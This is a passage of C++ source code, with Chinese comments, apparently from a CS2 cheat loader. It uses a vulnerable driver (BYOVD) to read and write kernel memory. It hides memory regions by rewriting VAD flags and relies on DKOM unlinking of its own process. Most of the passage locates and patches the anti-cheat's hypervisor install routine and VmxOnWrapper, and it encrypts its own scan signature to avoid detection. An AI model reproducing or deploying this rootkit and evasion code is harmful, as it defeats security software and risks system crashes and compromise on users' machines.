        if (!kma.ReadKernelVAUnsafe(vadNode + VadOffsets::RbnLeft, &left, 8)) {
            VadDiag("B554:FMVN:FAIL read left (traverse=%d)\n", traverseCount);
            return false;
        }
        if (!kma.ReadKernelVAUnsafe(vadNode + VadOffsets::RbnRight, &right, 8)) {
            VadDiag("B554:FMVN:FAIL read right (traverse=%d)\n", traverseCount);
            return false;
        }

        if (targetVpn < startVpn) {
            vadNode = left;
        } else {
            vadNode = right;
        }
    }
    VadDiag("B554:FMVN:FAIL maxDepth reached (traverse=%d)\n", traverseCount);
    return false;
}

bool VADConcealer::ConcealRegion(DWORD pid, uintptr_t regionBase, SIZE_T regionSize) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive() || !regionBase || !regionSize) return false;

    uint64_t ntosBase = kma.GetNtoskrnlBase();
    if (!ntosBase) {
        VadDiag("B554:CR: FAIL ntosBase=0\n");
        return false;
    }

    // ★ BUILD 555: 动态解析 EPROCESS 偏移 (替代硬编码 0x440/0x448)
    if (!EnsureEprocessOffsets(kma, ntosBase)) {
        VadDiag("B554:CR: FAIL EnsureEprocessOffsets (ntosBase=0x%llX)\n",
                  (unsigned long long)ntosBase);
        return false;
    }

    // 获取 loader.exe 的 EPROCESS (使用动态偏移)
    // ★ BUILD 567 v3.235: 优先使用缓存的 EPROCESS (DKOM 隐藏后链表找不到 loader.exe)
    //   原因: DKOM 成功断链 loader.exe 后, GetEPROCESSByPid 遍历 ActiveProcessLinks 找不到.
    //   修复: VAD 在 DKOM 之前执行时缓存 EPROCESS; 后续调用 (含主循环) 直接用缓存.
    //   安全性: EPROCESS 地址在进程生命周期内不变, DKOM 断链不修改 EPROCESS 地址.
    uint64_t eprocess = s_cachedLoaderEprocess;
    if (!eprocess) {
        eprocess = GetEPROCESSByPid(kma, pid, ntosBase, s_pidOffset, s_linksOffset);
        if (!eprocess) {
            VadDiag("B554:CR: FAIL GetEPROCESSByPid (pid=%u, no cache)\n", pid);
            return false;
        }
        s_cachedLoaderEprocess = eprocess;  // 缓存, 后续 DKOM 隐藏后仍可用
        VadDiag("B554:CR: cached eprocess=0x%llX (pid=%u)\n",
                  (unsigned long long)eprocess, pid);
    } else {
        VadDiag("B554:CR: using cached eprocess=0x%llX (pid=%u, bypass ActiveProcessLinks)\n",
                  (unsigned long long)eprocess, pid);
    }

    // ★ BUILD 555: 动态解析 VadRoot 偏移 (替代硬编码 0x7D8/0x658)
    if (!EnsureVadRootOffset(kma, eprocess)) {
        VadDiag("B554:CR: FAIL EnsureVadRootOffset (eprocess=0x%llX)\n",
                  (unsigned long long)eprocess);
        return false;
    }

    // ★ BUILD 567 v3.233: 使用 ReadUnsafe 读取 vadRoot (eprocess 可能在系统 PTE 区域)
    // ★ BUILD 567 v3.272 FIX: 移除 v3.271 错误的双重解引用
    //   EPROCESS+s_vadRootOffset 的值就是指向 _RTL_BALANCED_NODE 的指针 (即 VAD 树根节点).
    //   _RTL_AVL_TREE 结构体只有一个 Root 字段, 读取该偏移即得到 Root 指针.
    //   v3.271 错误: 多解引用一次 → 读到根节点的 Left 字段 → 遍历错误子树.
    uint64_t vadRoot = kma.ReadUnsafe<uint64_t>(eprocess + s_vadRootOffset);
    if (!vadRoot || vadRoot < 0xFFFF800000000000ULL) {
        VadDiag("B554:CR: FAIL vadRoot invalid (off=0x%X val=0x%llX)\n",
                  s_vadRootOffset, (unsigned long long)vadRoot);
        return false;
    }
    // 遍历 VAD 树, 查找并修改匹配区域
    VadDiag("B554:CR: enter FindAndModifyVadNode vadRoot=0x%llX target=0x%llX\n",
              (unsigned long long)vadRoot, (unsigned long long)regionBase);
    bool ok = FindAndModifyVadNode(kma, vadRoot, regionBase, pid);
    VadDiag("B554:CR: FindAndModifyVadNode result=%d\n", (int)ok);
    return ok;
}

int VADConcealer::ConcealAllRegions(DWORD pid, const uintptr_t* bases, int count) {
    int success = 0;
    for (int i = 0; i < count && i < 32; i++) {
        if (bases[i] && ConcealRegion(pid, bases[i], 0x10000)) {
            success++;
        }
    }
    return success;
}

// ★ v3.296 FIX-22: 恢复所有被修改的 VAD 节点 (CS2 退出时调用, 防止 PspExitProcess 0x3B 蓝屏)
//   原因: ConcealRegion 清零 PrivateMemory bit → 内核清理 VAD 时 dereference ControlArea (NULL) → 0x3B
//   修复: 遍历 s_modifiedVads, 恢复每个节点的原始 VadFlags
//   ★ FIX-22b: 只恢复 loader.exe 的 VAD 节点 (pid == GetCurrentProcessId())
//     原因: s_modifiedVads 包含 CS2 和 loader.exe 两类 VAD 节点.
//           CS2 退出后, CS2 的 VAD 节点被内核释放, 恢复 CS2 的 VAD → 写入已释放内存 → 蓝屏!
//     修复: RecordModifiedVad 记录 pid, RestoreAllRegions 只恢复 loader.exe 的 VAD.
//           loader.exe 的 VAD 在进程退出时才被清理, 此时恢复是安全的.
void VADConcealer::RestoreAllRegions() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return;

    DWORD loaderPid = GetCurrentProcessId();
    int restored = 0;
    int skipped = 0;
    for (int i = 0; i < s_modifiedVadCount; i++) {
        uint64_t nodeAddr = s_modifiedVads[i].nodeAddr;
        uint32_t origFlags = s_modifiedVads[i].origFlags;
        DWORD pid = s_modifiedVads[i].pid;
        // ★ FIX-22b: 跳过 CS2 的 VAD 节点 (CS2 退出后 VAD 已释放, 写入会蓝屏)
        if (pid != loaderPid) {
            skipped++;
            continue;
        }
        if (nodeAddr >= 0xFFFF800000000000ULL && nodeAddr < 0xFFFFFD0000000000ULL) {
            kma.WriteUnsafe<uint32_t>(nodeAddr + VadOffsets::VadFlags, origFlags);
            restored++;
        }
    }
    StateLog("VAD", "RestoreAll", "restored=%d skipped=%d/%d", restored, skipped, s_modifiedVadCount);
    s_modifiedVadCount = 0;  // 清空记录
}

// ★ v3.296 FIX-22: 记录被修改的 VAD 节点 (FindAndModifyVadNode 调用)
void VADConcealer::RecordModifiedVad(uint64_t nodeAddr, uint32_t origFlags, DWORD pid) {
    if (s_modifiedVadCount < MAX_MODIFIED_VADS) {
        s_modifiedVads[s_modifiedVadCount].nodeAddr = nodeAddr;
        s_modifiedVads[s_modifiedVadCount].origFlags = origFlags;
        s_modifiedVads[s_modifiedVadCount].pid = pid;
        s_modifiedVadCount++;
    }
}

// ============================================================
// ★ BUILD 552: ShvInstallPatcher — PAC SHV 主动防御 (方案 D)
//   详见 byovd_kernel.h 中的类注释和 PAC_SHV_逆向分析报告.md §13.4
// ============================================================

// 静态成员定义
uint8_t ShvInstallPatcher::m_originalBytes[6] = {};
bool ShvInstallPatcher::m_hasOriginalBytes = false;
uint64_t ShvInstallPatcher::m_patchedAddress = 0;
// ★ BUILD 555 P2-1: 降级检测状态成员定义
uint32_t ShvInstallPatcher::m_consecutiveFailures = 0;
bool     ShvInstallPatcher::m_degradedMode = false;
DWORD    ShvInstallPatcher::m_lastPatchTick = 0;

// ★ BUILD 566: VmxOnWrapper patch 状态静态成员定义
uint8_t ShvInstallPatcher::m_vmxOnOriginalBytes[3] = {};
bool     ShvInstallPatcher::m_hasVmxOnOriginalBytes = false;
uint64_t ShvInstallPatcher::m_vmxOnPatchedAddress = 0;

// ★ BUILD 566 加固 v3.226: VmxOnWrapper patch 独立降级模式状态定义
//   与 SHV_Install patch 降级状态 (m_consecutiveFailures/m_degradedMode/m_lastPatchTick) 完全独立
uint32_t ShvInstallPatcher::m_vmxOnConsecutiveFailures = 0;
bool     ShvInstallPatcher::m_vmxOnDegradedMode = false;
DWORD    ShvInstallPatcher::m_vmxOnLastPatchTick = 0;

// ============================================================
// ★ BUILD 555 P2-1: SHV patch 降级检测实现
//
// 设计目标:
//   - PAC 周期性恢复 SHV_Install patch → payload 周期性重 patch →
//     每次重 patch 触发 4-6 次 BYOVD IOCTL (ReadKernelVA/WriteKernelVA/读回验证)
//   - 若 PAC 恢复频率过高 (如 <60s), 累积 IOCTL 频率可能接近 PDFWKRNL.sys
//     卡死基线 (1400 IOCTL/min), 触发驱动卡死 → 整个 BYOVD 通道失效
//   - 降级策略: 连续 patch 失败 ≥3 次后, 跳过周期性 SHV patch 检查,
//     依赖 MinifilterNeutralizer (操作回调 stub) 作为主要 minifilter 防护
//
// 失败计数语义:
//   - "失败" = PatchShvInstallEntry() 返回 false (PAC 未加载/特征码未匹配/写入失败等)
//   - "成功" = PatchShvInstallEntry() 返回 true (patch 写入并验证通过)
//   - 已 patched 状态 (IsPatched() == true) 的快速返回不算失败也不算成功
//     (不更新计数, 避免无意义的状态变化)
//
// 自恢复机制:
//   - 降级模式下若距上次尝试 >5 分钟, IsDegradedMode() 返回 false 允许重试
//   - 避免 PAC 临时卸载或重启后永远无法重新 patch
//   - 5 分钟间隔足够长, 不会触发频繁 IOCTL (即使恢复后立即失败也只是 1 次/5min)
// ============================================================

void ShvInstallPatcher::RecordPatchFailure() {
    m_lastPatchTick = GetTickCount();
    m_consecutiveFailures++;
    // ★ BUILD 567 v3.227: 失败计数 + 状态日志
    g_logStats.shvPatchFailure++;
    StateLog("SHV", "FAILED", "consecutive=%u tick=%u",
        (unsigned)m_consecutiveFailures, (unsigned)GetTickCount());
    if (m_consecutiveFailures >= DEGRADED_FAILURE_THRESHOLD && !m_degradedMode) {
        m_degradedMode = true;
        g_logStats.degradedEnter++;  // ★ BUILD 567: 降级模式触发计数
        ByovdDiag("BYOVD:ShvPatch: DEGRADED MODE entered (failures=%u)\n",
            m_consecutiveFailures);
        StateLog("SHV", "DEGRADED_ENTER", "failures=%u", (unsigned)m_consecutiveFailures);
    }
}

void ShvInstallPatcher::RecordPatchSuccess() {
    m_lastPatchTick = GetTickCount();
    if (m_consecutiveFailures > 0 || m_degradedMode) {
        ByovdDiag("BYOVD:ShvPatch: recovered from degraded (failures=%u, was_degraded=%d)\n",
            m_consecutiveFailures, (int)m_degradedMode);
        // ★ BUILD 567 v3.227: 降级恢复状态日志
        StateLog("SHV", "DEGRADED_RECOVER", "failures=%u was_degraded=%d",
            (unsigned)m_consecutiveFailures, (int)m_degradedMode);
    }
    m_consecutiveFailures = 0;
    m_degradedMode = false;
}

bool ShvInstallPatcher::IsDegradedMode() {
    if (!m_degradedMode) return false;
    // ★ 自恢复: 降级模式下若距上次 patch 尝试 >5 分钟, 退出降级模式允许重试
    //   避免 PAC 临时卸载/重启 SHV 后永远无法重新 patch
    //   GetTickCount DWORD 溢出时 (now - lastTick) 无符号算术仍正确 (与 VEH 重置逻辑一致)
    DWORD now = GetTickCount();
    DWORD elapsed = now - m_lastPatchTick;
    if (elapsed > DEGRADED_RECOVERY_INTERVAL_MS) {
        m_degradedMode = false;
        m_consecutiveFailures = 0;
        ByovdDiag("BYOVD:ShvPatch: DEGRADED MODE auto-recover after %ums\n",
            (unsigned)elapsed);
        // ★ BUILD 567 v3.227: 自恢复状态日志
        StateLog("SHV", "DEGRADED_RECOVER", "auto after %ums", (unsigned)elapsed);
        return false;
    }
    return true;
}

// ============================================================
// ★ BUILD 566 加固 v3.226: VmxOnWrapper patch 独立降级模式实现
//
// 设计目标:
//   - PAC 周期性恢复 VmxOnWrapper patch (从 31 C0 C3 → 原始字节) →
//     payload 周期性重 patch → 每次重 patch 触发 3-5 次 BYOVD IOCTL
//     (ReadKernelVA + WriteKernelVA + 读回验证)
//   - 若 PAC 恢复频率过高 (如 <60s), 累积 IOCTL 频率可能接近 PDFWKRNL.sys
//     卡死基线 (1400 IOCTL/min), 触发驱动卡死 → 整个 BYOVD 通道失效
//   - 降级策略: 连续 patch 失败 ≥3 次后, 跳过周期性 VmxOnWrapper 检查,
//     依赖 SHV_Install patch (双重保险的另一道) 作为主要 VMX 防护
//
// 状态隔离 (与 SHV_Install patch 降级模式完全独立):
//   - m_vmxOnConsecutiveFailures ≠ m_consecutiveFailures
//   - m_vmxOnDegradedMode        ≠ m_degradedMode
//   - m_vmxOnLastPatchTick       ≠ m_lastPatchTick
//   原因: VmxOnWrapper RVA 失效 (PAC 更新) 不应触发 SHV_Install patch 降级,
//         反之亦然. 两者独立失败计数, 独立降级, 独立自恢复.
//
// 失败计数语义 (与 SHV_Install patch 一致):
//   - "失败" = PatchVmxOnWrapper() 返回 false (PAC 未加载/RVA 失效/写入失败等)
//   - "成功" = PatchVmxOnWrapper() 返回 true (patch 写入并验证通过)
//   - 已 patched 状态 (IsVmxOnPatched() == true) 的快速返回不算失败也不算成功
//     (不更新计数, 避免无意义的状态变化)
//   注: PAC 未加载 (pacBase == 0) 也算失败, 与 PatchShvInstallEntry 一致;
//       降级模式下 5 分钟自恢复后重新尝试, 不影响 PAC 重载后 patch.
//
// 自恢复机制 (与 SHV_Install patch 一致):
//   - 降级模式下若距上次尝试 >5 分钟, IsVmxOnDegradedMode() 返回 false 允许重试
//   - 避免 PAC 临时卸载或重启后永远无法重新 patch
//   - GetTickCount DWORD 溢出时 (now - lastTick) 无符号算术仍正确
// ============================================================

void ShvInstallPatcher::RecordVmxOnPatchFailure() {
    m_vmxOnLastPatchTick = GetTickCount();
    m_vmxOnConsecutiveFailures++;
    // ★ BUILD 567 v3.227: 失败计数 + 状态日志
    g_logStats.vmxOnPatchFailure++;
    StateLog("VMXON", "FAILED", "consecutive=%u tick=%u",
        (unsigned)m_vmxOnConsecutiveFailures, (unsigned)GetTickCount());
    if (m_vmxOnConsecutiveFailures >= DEGRADED_FAILURE_THRESHOLD && !m_vmxOnDegradedMode) {
        m_vmxOnDegradedMode = true;
        g_logStats.degradedEnter++;  // ★ BUILD 567: 降级模式触发计数
        ByovdDiag("BYOVD:VmxOn: DEGRADED MODE entered (failures=%u)\n",
            m_vmxOnConsecutiveFailures);
        StateLog("VMXON", "DEGRADED_ENTER", "failures=%u", (unsigned)m_vmxOnConsecutiveFailures);
    }
}

void ShvInstallPatcher::RecordVmxOnPatchSuccess() {
    m_vmxOnLastPatchTick = GetTickCount();
    if (m_vmxOnConsecutiveFailures > 0 || m_vmxOnDegradedMode) {
        ByovdDiag("BYOVD:VmxOn: recovered from degraded (failures=%u, was_degraded=%d)\n",
            m_vmxOnConsecutiveFailures, (int)m_vmxOnDegradedMode);
        // ★ BUILD 567 v3.227: 降级恢复状态日志
        StateLog("VMXON", "DEGRADED_RECOVER", "failures=%u was_degraded=%d",
            (unsigned)m_vmxOnConsecutiveFailures, (int)m_vmxOnDegradedMode);
    }
    m_vmxOnConsecutiveFailures = 0;
    m_vmxOnDegradedMode = false;
}

bool ShvInstallPatcher::IsVmxOnDegradedMode() {
    if (!m_vmxOnDegradedMode) return false;
    // ★ 自恢复: 降级模式下若距上次 patch 尝试 >5 分钟, 退出降级模式允许重试
    //   避免 PAC 临时卸载/重启 SHV 后永远无法重新 patch
    //   GetTickCount DWORD 溢出时 (now - lastTick) 无符号算术仍正确 (与 VEH 重置逻辑一致)
    DWORD now = GetTickCount();
    DWORD elapsed = now - m_vmxOnLastPatchTick;
    if (elapsed > DEGRADED_RECOVERY_INTERVAL_MS) {
        m_vmxOnDegradedMode = false;
        m_vmxOnConsecutiveFailures = 0;
        ByovdDiag("BYOVD:VmxOn: DEGRADED MODE auto-recover after %ums\n",
            (unsigned)elapsed);
        // ★ BUILD 567 v3.227: 自恢复状态日志
        StateLog("VMXON", "DEGRADED_RECOVER", "auto after %ums", (unsigned)elapsed);
        return false;
    }
    return true;
}

// ★ BUILD 553: SIG1 特征码 XOR 加密 (修复 A3 缺陷)
//   原因: BUILD 552 中 SIG1 = { 0x48, 0xB9, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00 }
//         是明文 const 数组, 进入 .rdata 后 PAC 可反向利用 (扫描此特征 = 发现 patcher)
//   策略: 编译期 XOR 加密, 运行时用 g_sig1Key (volatile 防常量传播) 解密到栈上
//   密钥 0xA7, 加密后字节: 0xEF 0x1E 0xA7 0xA7 0xA7 0x27 0xA7 0xA7 0xA7 0xA7
//   参考: payload.cpp L535 g_patKey 模式
static volatile uint8_t g_sig1Key = 0xA7;
static const uint8_t SIG1_ENC[10] = {
    0xEF, 0x1E, 0xA7, 0xA7, 0xA7, 0x27, 0xA7, 0xA7, 0xA7, 0xA7
};

// ★ BUILD 561: IsValidPrologueByte — 合法函数序言字节验证 (统一辅助函数)
//   原 BUILD 553 内联验证: 仅接受 0x48 (REX.W) / 0x55 (push rbp) / 0x40-0x4F (REX prefix)
//   BUILD 561 放宽: 新增 0x53 (push rbx) / 0x56 (push rsi) / 0x57 (push rdi)
//     原因: MSVC/Clang 编译的函数序言常用 push rbx/rsi/rdi 保存 callee-saved 寄存器,
//           原 BUILD 553 仅接受 push rbp (0x55), 导致序言为 push rbx 的函数边界查找失败.
//     风险评估: 极低 — 0x53/0x56/0x57 在指令中间也可能出现 (如 push [mem] 的 ModRM 字节),
//               但配合三级边界查找 (0xCC/0x90×2/0x00×4/0xC3+0xCC) 后误判率极低,
//               且仅在 Pass 1-3 均失败时才影响 Pass 4 结果.
//   排除: 0x00 (零) / 0xCC (int3) / 0x90 (nop) 等填充字节 (由调用方在边界查找时已跳过)
static inline bool IsValidPrologueByte(uint8_t b) {
    if (b == 0x48 || b == 0x55) return true;                   // REX.W / push rbp
    if (b >= 0x40 && b <= 0x4F) return true;                   // REX prefix (40-4F)
    if (b == 0x53 || b == 0x56 || b == 0x57) return true;      // push rbx/rsi/rdi (BUILD 561)
    return false;
}

uint64_t ShvInstallPatcher::FindShvInstallEntry(uint64_t pacModuleBase, uint64_t textSectionVA, uint32_t textSize) {
    // 通过特征码扫描定位 SHV_Install 入口
    // 特征 (PAC_SHV_逆向分析报告 §3.2 L101-105):
    //   MOV RCX, 0x80000000        ; 48 B9 00 00 00 80 00 00 00 00 (10 字节)
    //   CALL CheckPhysicalMemoryLimit  ; E8 xx xx xx xx (5 字节)
    //
    // SHV_Install 入口在特征 1 之前若干字节 (函数序言: sub rsp / push 等)
    // 向前回溯查找函数边界 (0xCC int3 填充 或 对齐填充 0x90/0x00)
    //
    // ★ BUILD 562: 多特征码兜底 — SIG1 失败后尝试 SIG2
    //   SIG2: CALL BroadcastToAllCpus + CALL WaitForCompletion 配对 (报告 §3.2 L146-147)
    //   字节模式: E8 xx xx xx xx E8 xx xx xx xx (两个连续 CALL rel32)
    //   验证: 第一个 CALL 目标 = pacModuleBase + 0xEADC4 (BroadcastToAllCpus)
    //         第二个 CALL 目标 = pacModuleBase + 0xEAE4D (WaitForCompletion)

    if (!textSectionVA || textSize < 0x1000) return 0;

    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    // ★ 分块读取 .text 段 (避免一次性分配大缓冲区)
    //   块大小 64KB, 在块内扫描特征码
    constexpr uint32_t CHUNK_SIZE = 0x10000;  // 64 KB
    constexpr uint32_t OVERLAP = 32;          // 块间重叠 (避免跨块特征码漏检)

    // 特征码 1: MOV RCX, 0x80000000 = 48 B9 00 00 00 80 00 00 00 00
    //   48 = REX.W, B9 = mov ecx, imm32 (REX.W 扩展为 mov rcx, imm64)
    //   imm64 = 0x0000008000000000? 不对, MOV RCX, imm64 是 48 B9 + 8 字节 imm64
    //   0x80000000 = 2GB, imm64 = 0x0000000080000000 (8 字节小端)
    //   字节序列: 48 B9 00 00 00 80 00 00 00 00 (10 字节)
    // ★ BUILD 553: 运行时从 SIG1_ENC 解密 (消除 .rdata 明文特征码)
    uint8_t SIG1[10];
    for (int j = 0; j < 10; j++) {
        SIG1[j] = SIG1_ENC[j] ^ g_sig1Key;
    }

    uint8_t buf[CHUNK_SIZE + OVERLAP];
    uint32_t scanned = 0;

    // ============================================================
    // ★ BUILD 562: SIG1 扫描 (MOV RCX, 0x80000000 + CALL rel32)
    // ============================================================
    while (scanned < textSize) {
        uint32_t readSize = CHUNK_SIZE;
        if (scanned + readSize > textSize) {
            readSize = textSize - scanned;
        }
        if (readSize < sizeof(SIG1) + 5) break;  // 不足以容纳特征码

        uint64_t chunkAddr = textSectionVA + scanned;
        if (!kma.ReadKernelVA(chunkAddr, buf, readSize)) {
            // 读失败, 跳过此块
            scanned += CHUNK_SIZE;
            continue;
        }

        // 在 buf[0..readSize-10] 中查找 SIG1
        for (uint32_t i = 0; i + 15 <= readSize; i++) {
            // 比对 SIG1 (10 字节)
            bool match = true;
            for (int j = 0; j < 10; j++) {
                if (buf[i + j] != SIG1[j]) { match = false; break; }
            }
            if (!match) continue;

            // 验证紧跟 CALL rel32 (E8 xx xx xx xx)
            if (i + 15 > readSize) break;  // 不够容纳 CALL
            if (buf[i + 10] != 0xE8) continue;

            // ★ 找到特征码位置! 绝对 VA = chunkAddr + i
            uint64_t sigVA = chunkAddr + i;

            // ★ SHV_Install 入口在 sigVA 之前 (函数序言 + 局部变量初始化)
            //   根据 PAC_SHV_逆向分析报告 §3.2 L99-100:
            //     SHV_Install:
            //         (1) 检查物理内存是否超过 EPT 映射限制
            //         MOV  RCX, 0x80000000        ; ← 这是 sigVA
            //         CALL CheckPhysicalMemoryLimit
            //   所以 SHV_Install 入口就在 sigVA 处或紧前
            //
            //   向前回溯查找函数边界 (前一个函数末尾的 0xCC int3 填充)
            //   最多回溯 256 字节 (SHV_Install 序言不会超过 256 字节)
            constexpr uint32_t MAX_BACKSCAN = 256;
            uint8_t backscan[MAX_BACKSCAN];
            uint32_t backscanSize = (i < MAX_BACKSCAN) ? i : MAX_BACKSCAN;
            uint64_t backscanStart = sigVA - backscanSize;

            if (backscanSize > 0 && kma.ReadKernelVA(backscanStart, backscan, backscanSize)) {
                // ★ BUILD 561: Pass 1-4 边界查找 (统一使用 IsValidPrologueByte)
                // Pass 1: 0xCC (int3)
                for (int32_t k = backscanSize - 1; k >= 0; k--) {
                    if (backscan[k] == 0xCC) {
                        uint32_t entryOffset = k + 1;
                        if (entryOffset >= backscanSize) continue;
                        if (IsValidPrologueByte(backscan[entryOffset])) {
                            return backscanStart + entryOffset;
                        }
                    }
                }
                // Pass 2: 0x90 连续 ≥2
                for (int32_t k = backscanSize - 2; k >= 0; k--) {
                    if (backscan[k] == 0x90 && backscan[k + 1] == 0x90) {
                        uint32_t entryOffset = k + 2;
                        while (entryOffset < backscanSize && backscan[entryOffset] == 0x90) entryOffset++;
                        if (entryOffset >= backscanSize) continue;
                        if (IsValidPrologueByte(backscan[entryOffset])) {
                            return backscanStart + entryOffset;
                        }
                    }
                }
                // Pass 3: 0x00 连续 ≥4
                for (int32_t k = backscanSize - 4; k >= 0; k--) {
                    if (backscan[k] == 0x00 && backscan[k + 1] == 0x00 &&
                        backscan[k + 2] == 0x00 && backscan[k + 3] == 0x00) {
                        uint32_t entryOffset = k + 4;
                        while (entryOffset < backscanSize && backscan[entryOffset] == 0x00) entryOffset++;
                        if (entryOffset >= backscanSize) continue;
                        if (IsValidPrologueByte(backscan[entryOffset])) {
                            return backscanStart + entryOffset;
                        }
                    }
                }
                // ★ BUILD 561: Pass 4: 0xC3 (ret) + 0xCC (int3)
                for (int32_t k = backscanSize - 2; k >= 0; k--) {
                    if (backscan[k] == 0xC3 && backscan[k + 1] == 0xCC) {
                        uint32_t entryOffset = k + 2;
                        while (entryOffset < backscanSize && backscan[entryOffset] == 0xCC) entryOffset++;
                        if (entryOffset >= backscanSize) continue;
                        if (IsValidPrologueByte(backscan[entryOffset])) {
                            return backscanStart + entryOffset;
                        }
                    }
                }
            }

            // ★ BUILD 553: 所有边界查找策略均失败, 保守返回 0 (避免误 patch)
            ByovdDiag("BYOVD:ShvPatch: SIG1 found @ 0x%llX but no function boundary detected\n",
                (unsigned long long)sigVA);
            return 0;
        }

        scanned += CHUNK_SIZE;
        // 不需要 overlap, 因为特征码 15 字节 < CHUNK_SIZE
    }

    // SIG1 未找到, 记录日志
    ByovdDiag("BYOVD:ShvPatch: SIG1 not found in .text (size=0x%X), trying SIG2...\n", textSize);

    // ============================================================
    // ★ BUILD 562: SIG2 扫描 (CALL BroadcastToAllCpus + CALL WaitForCompletion 配对)
    //   字节模式: E8 xx xx xx xx E8 xx xx xx xx (两个连续 CALL rel32)
    //   验证: 第一个 CALL 目标 = pacModuleBase + 0xEADC4 (BroadcastToAllCpus)
    //         第二个 CALL 目标 = pacModuleBase + 0xEAE4D (WaitForCompletion)
    //   可靠性: BroadcastToAllCpus + WaitForCompletion 配对在 SHV_Install 中是特有的
    //           (报告 §3.2 L146-147 确认 SHV_Install 调用这两个函数启动 per-CPU SHV)
    //   不需要 XOR 加密: E8 是通用 CALL 操作码, 不构成特征
    // ============================================================
    if (!pacModuleBase) {
        ByovdDiag("BYOVD:ShvPatch: SIG2 skipped — pacModuleBase=0\n");
        return 0;
    }

    uint64_t broadcastTarget = pacModuleBase + SIG2_BROADCAST_RVA;
    uint64_t waitTarget      = pacModuleBase + SIG2_WAIT_RVA;

    scanned = 0;
    while (scanned < textSize) {
        uint32_t readSize = CHUNK_SIZE;
        if (scanned + readSize > textSize) {
            readSize = textSize - scanned;
        }
        if (readSize < 10) break;  // 不足以容纳双 CALL (5+5)

        uint64_t chunkAddr = textSectionVA + scanned;
        if (!kma.ReadKernelVA(chunkAddr, buf, readSize)) {
            scanned += CHUNK_SIZE;
            continue;
        }

        // 在 buf[0..readSize-10] 中查找双 CALL rel32 模式
        for (uint32_t i = 0; i + 10 <= readSize; i++) {
            // 两个连续 CALL rel32 (E8 xx xx xx xx E8 xx xx xx xx)
            if (buf[i] != 0xE8 || buf[i + 5] != 0xE8) continue;

            // 计算两个 CALL 的目标地址
            // CALL rel32 目标 = call指令地址 + 5 + rel32
            int32_t rel1 = (int32_t)((uint32_t)buf[i + 1] |
                                      ((uint32_t)buf[i + 2] << 8) |
                                      ((uint32_t)buf[i + 3] << 16) |
                                      ((uint32_t)buf[i + 4] << 24));
            int32_t rel2 = (int32_t)((uint32_t)buf[i + 6] |
                                      ((uint32_t)buf[i + 7] << 8) |
                                      ((uint32_t)buf[i + 8] << 16) |
                                      ((uint32_t)buf[i + 9] << 24));

            uint64_t call1VA = chunkAddr + i + 5 + (int64_t)rel1;
            uint64_t call2VA = chunkAddr + i + 10 + (int64_t)rel2;

            // 验证目标地址
            if (call1VA != broadcastTarget) continue;
            if (call2VA != waitTarget) continue;

            // ★ 找到 SIG2! 绝对 VA = chunkAddr + i
            uint64_t sigVA = chunkAddr + i;
            ByovdDiag("BYOVD:ShvPatch: SIG2 found @ 0x%llX (BroadcastToAllCpus+WaitForCompletion pair)\n",
                (unsigned long long)sigVA);

            // SHV_Install 入口在 sigVA 之前 (回溯边界查找)
            //   SIG2 在 SHV_Install 函数体的后半部分 (§3.2 L146-147, 在 MOV RAX,CR3 之后)
            //   回溯距离可能比 SIG1 更大, 但仍限制在 256 字节内
            //   (SHV_Install 函数体 ~256 字节, SIG2 在函数末尾附近)
            constexpr uint32_t MAX_BACKSCAN = 256;
            uint8_t backscan[MAX_BACKSCAN];
            uint32_t backscanSize = (i < MAX_BACKSCAN) ? i : MAX_BACKSCAN;
            uint64_t backscanStart = sigVA - backscanSize;

            if (backscanSize > 0 && kma.ReadKernelVA(backscanStart, backscan, backscanSize)) {
                // Pass 1: 0xCC (int3)
                for (int32_t k = backscanSize - 1; k >= 0; k--) {
                    if (backscan[k] == 0xCC) {
                        uint32_t entryOffset = k + 1;
                        if (entryOffset >= backscanSize) continue;
                        if (IsValidPrologueByte(backscan[entryOffset])) {
                            ByovdDiag("BYOVD:ShvPatch: SIG2 boundary found via Pass1 (0xCC) @ 0x%llX\n",
                                (unsigned long long)(backscanStart + entryOffset));
                            return backscanStart + entryOffset;
                        }
                    }
                }
                // Pass 2: 0x90 连续 ≥2
                for (int32_t k = backscanSize - 2; k >= 0; k--) {
                    if (backscan[k] == 0x90 && backscan[k + 1] == 0x90) {
                        uint32_t entryOffset = k + 2;
                        while (entryOffset < backscanSize && backscan[entryOffset] == 0x90) entryOffset++;
                        if (entryOffset >= backscanSize) continue;
                        if (IsValidPrologueByte(backscan[entryOffset])) {
                            ByovdDiag("BYOVD:ShvPatch: SIG2 boundary found via Pass2 (0x90×2) @ 0x%llX\n",
                                (unsigned long long)(backscanStart + entryOffset));
                            return backscanStart + entryOffset;
                        }
                    }
                }
                // Pass 3: 0x00 连续 ≥4
                for (int32_t k = backscanSize - 4; k >= 0; k--) {
                    if (backscan[k] == 0x00 && backscan[k + 1] == 0x00 &&
                        backscan[k + 2] == 0x00 && backscan[k + 3] == 0x00) {
                        uint32_t entryOffset = k + 4;
                        while (entryOffset < backscanSize && backscan[entryOffset] == 0x00) entryOffset++;
                        if (entryOffset >= backscanSize) continue;
                        if (IsValidPrologueByte(backscan[entryOffset])) {
                            ByovdDiag("BYOVD:ShvPatch: SIG2 boundary found via Pass3 (0x00×4) @ 0x%llX\n",
                                (unsigned long long)(backscanStart + entryOffset));
                            return backscanStart + entryOffset;
                        }
                    }
                }
                // Pass 4: 0xC3 (ret) + 0xCC (int3)
                for (int32_t k = backscanSize - 2; k >= 0; k--) {
                    if (backscan[k] == 0xC3 && backscan[k + 1] == 0xCC) {
                        uint32_t entryOffset = k + 2;
                        while (entryOffset < backscanSize && backscan[entryOffset] == 0xCC) entryOffset++;
                        if (entryOffset >= backscanSize) continue;
                        if (IsValidPrologueByte(backscan[entryOffset])) {
                            ByovdDiag("BYOVD:ShvPatch: SIG2 boundary found via Pass4 (0xC3+0xCC) @ 0x%llX\n",
                                (unsigned long long)(backscanStart + entryOffset));
                            return backscanStart + entryOffset;
                        }
                    }
                }
            }

            // SIG2 边界查找失败, 保守返回 0
            ByovdDiag("BYOVD:ShvPatch: SIG2 found @ 0x%llX but no function boundary detected\n",
                (unsigned long long)sigVA);
            return 0;
        }

        scanned += CHUNK_SIZE;
    }

    ByovdDiag("BYOVD:ShvPatch: SIG2 not found in .text (size=0x%X)\n", textSize);
    return 0;
}

// ============================================================
